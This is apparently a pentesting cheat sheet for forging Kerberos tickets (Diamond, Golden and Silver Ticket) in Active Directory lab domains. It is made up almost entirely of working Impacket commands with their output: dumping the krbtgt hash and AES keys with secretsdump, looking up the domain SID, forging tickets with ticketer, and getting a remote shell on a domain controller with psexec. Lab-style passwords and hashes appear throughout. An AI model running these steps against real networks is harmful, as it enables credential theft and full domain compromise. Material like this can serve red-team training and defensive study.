# KRB5 Forgery

## Diamond Ticket

### Execution

```bash
impacket-secretsdump contoso/Administrator:'P@$$wd!'@192.168.1.11
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# 
# [*] Service RemoteRegistry is in stopped state
# [*] Starting service RemoteRegistry
# ...
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:52bc1ee1544f9424b5324aa9b4dd2f01:::
# [*] Kerberos keys grabbed
# krbtgt:aes256-cts-hmac-sha1-96:0d1d0107405301e6a36dd83aa10eafa8970224943015c66f7856b1742374bc52

impacket-lookupsid  contoso/michael:'Tup4M1$h4'@192.168.1.11
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# 
# [*] Brute forcing SIDs at 192.168.1.11
# [*] StringBinding ncacn_np:192.168.1.11[\pipe\lsarpc]
# [*] Domain SID is: S-1-5-21-1666408051-1433414683-20088286

impacket-ticketer -request \
-nthash '52bc1ee1544f9424b5324aa9b4dd2f01' \
-aesKey '0d1d0107405301e6a36dd83aa10eafa8970224943015c66f7856b1742374bc52' \
-domain 'contoso.lab' \
-user 'michael' -password 'Tup4M1$h4' \
-domain-sid 'S-1-5-21-1666408051-1433414683-20088286' \
-user-id '500' -groups '512,513,518,519,520' "Administrator"
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# 
# [*] Requesting TGT to target domain to use as basis
# [*] Customizing ticket for contoso.lab/Administrator
# [*]     PAC_LOGON_INFO
# [*]     PAC_CLIENT_INFO_TYPE
# [*]     EncTicketPart
# [*]     EncAsRepPart
# [*] Signing/Encrypting final ticket
# [*]     PAC_SERVER_CHECKSUM
# [*]     PAC_PRIVSVR_CHECKSUM
# [*]     EncTicketPart
# [*]     EncASRepPart
# [*] Saving ticket in Administrator.ccache

export KRB5CCNAME="Administrator.ccache"

klist
# Ticket cache: FILE:Administrator.ccache
# Default principal: Administrator@CONTOSO.LAB
# ...

impacket-psexec -k win-dc01.contoso.lab
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# 
# [*] Requesting shares on win-dc01.contoso.lab.....
# [*] Found writable share ADMIN$
# [*] Uploading file IfBJyAho.exe
# [*] Opening SVCManager on win-dc01.contoso.lab.....
# [*] Creating service VCvE on win-dc01.contoso.lab.....
# [*] Starting service VCvE.....
# [!] Press help for extra shell commands
# Microsoft Windows [Version 10.0.14393]
# (c) 2016 Microsoft Corporation. All rights reserved.
# 
# C:\Windows\system32>
```

## Golden Ticket

### Execution

```bash
impacket-secretsdump -outputfile secretsdump.txt 'contoso.org'/'Administrator':'win2016-cli-P@$swd1!'@'192.168.68.64'

cat secretsdump.txt.ntds
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:c70399550b62d5f52c84b2a2fad7b41a:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:60fcae2d99c85fb300602b91223f9516:::
# ...

impacket-lookupsid contoso.org/Administrator@192.168.68.64
# Impacket v0.12.0.dev1 - Copyright 2023 Fortra
#
# Password:
# [*] Brute forcing SIDs at 192.168.68.64
# [*] StringBinding ncacn_np:192.168.68.64[\pipe\lsarpc]
# [*] Domain SID is: S-1-5-21-245103785-2483314120-3684157271
# ...

sudo impacket-ticketer \
-nthash '60fcae2d99c85fb300602b91223f9516' \
-domain-sid 'S-1-5-21-245103785-2483314120-3684157271' \
-domain 'contoso.org' 'Administrator'
# Impacket v0.12.0.dev1 - Copyright 2023 Fortra
#
# [*] Creating basic skeleton ticket and PAC Infos
# [*] Customizing ticket for contoso.org/Administrator
# [*]   PAC_LOGON_INFO
# [*]   PAC_CLIENT_INFO_TYPE
# [*]   EncTicketPart
# [*]   EncAsRepPart
# [*] Signing/Encrypting final ticket
# [*]   PAC_SERVER_CHECKSUM
# [*]   PAC_PRIVSVR_CHECKSUM
# [*]   EncTicketPart
# [*]   EncASRepPart
# [*] Saving ticket in Administrator.ccache
```

## Silver Ticket

### Execution

```bash
# get domain SID
impacket-lookupsid contoso.org/Administrator@192.168.68.179
# Impacket v0.12.0.dev1 - Copyright 2023 Fortra
#
# Password:
# [*] Brute forcing SIDs at 192.168.68.179
# [*] StringBinding ncacn_np:192.168.68.179[\pipe\lsarpc]
# [*] Domain SID is: S-1-5-21-245103785-2483314120-3684157271
# ...


# you can use any online NTLM hash generator to obtain -nthash if you only have password

# generate TGS that is signed with service account's kerberos key (derived from -nthash) 
# for the target user "Administrator" and target SPN MSSQLSvc and apply 512 group to that user
sudo ntpdate 192.168.68.64 && \
sudo impacket-ticketer \
-nthash fd72ca83b31d63f864440afa274bbd0c \
-domain-sid S-1-5-21-245103785-2483314120-3684157271 \
-domain contoso.org \
-spn HOST/WIN-KML6TP4LOOL \
Administrator
# 2025-02-20 02:31:38.877088 (+1100) +0.101192 +/- 0.000193 192.168.68.64 s1 no-leap
# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

# [*] Creating basic skeleton ticket and PAC Infos
# [*] Customizing ticket for contoso.org/Administrator
# [*]     PAC_LOGON_INFO
# [*]     PAC_CLIENT_INFO_TYPE
# [*]     EncTicketPart
# /usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
# encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
# [*]     EncTGSRepPart
# [*] Signing/Encrypting final ticket
# [*]     PAC_SERVER_CHECKSUM
# [*]     PAC_PRIVSVR_CHECKSUM
# [*]     EncTicketPart
# [*]     EncTGSRepPart
# [*] Saving ticket in Administrator.ccache
# Ticket cache: FILE:Administrator.ccache
# Default principal: Administrator@CONTOSO.ORG
```
